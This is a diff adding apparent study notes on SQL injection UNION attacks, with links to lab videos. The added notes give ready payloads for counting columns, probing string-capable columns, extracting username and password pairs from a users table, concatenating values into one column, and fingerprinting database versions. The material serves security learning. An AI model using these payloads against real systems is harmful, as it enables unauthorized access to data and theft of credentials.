@@ -93,4 +93,66 @@ For a UNION query to work, two key requirements must be met:
 ' ORDER BY 2--
 ' ORDER BY 3--
 etc.
--
+
+- Another method is submitting a series of UNION SELECT payloads specifying a different number of null values:
+
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+etc.
+If the number of nulls does not match the number of columns, the database returns an error
+
+### LAB 
+https://youtu.be/umXGHbEyW5I?si=YjvGtlbnkA_mdM0c
+
+## Database specific syntax
+On Oracle, every SELECT query must use the FROM keyword and specify a valid table. There is a built-in table on Oracle called dual which can be used for this purpose. So the injected queries on Oracle would need to look like:
+
+' UNION SELECT NULL FROM DUAL--
+
+After you determine the number of required columns, you can probe each column to test whether it can hold string data. You can submit a series of UNION SELECT payloads that place a string value into each column in turn. For example, if the query returns four columns, you would submit:
+
+' UNION SELECT 'a',NULL,NULL,NULL--
+' UNION SELECT NULL,'a',NULL,NULL--
+' UNION SELECT NULL,NULL,'a',NULL--
+' UNION SELECT NULL,NULL,NULL,'a'--
+If the column data type is not compatible with string data, the injected query will cause a database error
+
+## LAB
+https://youtu.be/SGBTC5D7DTs?si=K0SbVk7C3yhJ5kCo
+
+# Using a SQL injection UNION attack to retrieve interesting data
+- When you have found the columns and you know which columns hold string data, you are in a good position to retrieve interesting data.
+- Suppose that:
+
+The original query returns two columns, both of which can hold string data.
+The injection point is a quoted string within the WHERE clause.
+The database contains a table called users with the columns username and password.
+In this example, you can retrieve the contents of the users table by submitting the input:
+
+' UNION SELECT username, password FROM users--
+In order to perform this attack, you need to know that there is a table called users with two columns called username and password
+
+## LAB 
+https://youtu.be/PLa_oQtMl1U?si=iUBsLEkWiJAxFgJU
+
+# Retrieving multiple values within a single column
+- In some cases the table might only return a single column. You can join multiple values together within this column by submitting this input in burpsuite: '+UNION+SELECT+NULL,username||'~'||password+FROM+users--
+- Please note that this may differ based on the number of tables in the website (NULL)
+
+## LAB
+https://youtu.be/yRVYoqR9vrI?si=pOZ9fR_9kLNnqnqF
+
+# Examining the database in SQL injection attacks
+- When performing SQL injection it is very important to examine the database and find information about it. This includes the type and software of the database, and the number of columns and tables in the database
+- You can identify the type of database by submitting the following queries:
+- Database type	Query
+Microsoft, MySQL	SELECT @@version
+Oracle	SELECT * FROM v$version
+PostgreSQL	SELECT version()
+For example, you could use a UNION attack with the following input:
+
+' UNION SELECT @@version--
+
+## LAB 
+https://youtu.be/MFTk_LNRW0g?si=O3ixXs8q6otcu1vL
